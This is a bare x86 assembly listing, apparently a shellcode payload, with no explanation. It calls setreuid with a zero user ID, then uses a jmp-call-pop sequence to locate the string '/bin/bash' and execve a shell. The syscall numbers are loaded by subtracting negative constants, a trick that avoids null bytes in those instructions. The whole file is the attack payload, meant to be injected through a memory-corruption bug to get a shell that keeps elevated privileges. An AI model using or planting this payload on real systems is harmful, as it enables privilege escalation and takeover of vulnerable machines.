	.global _start

	.section .text
_start:	xor %eax, %eax
	mov %eax, %ebx
	sub $0xFFFFFFBA, %eax
	int $0x80
	jmp stub
	
shell:	xor %eax, %eax
	pop %esi
	push %eax
	push %esi
	mov %esi, %ebx
	mov %esp, %ecx
	mov %eax, %edx
	sub $0xFFFFFFF5, %eax
	int $0x80
	jmp .
stub:	call shell
argv:	.ascii "/bin/bash\0"
	
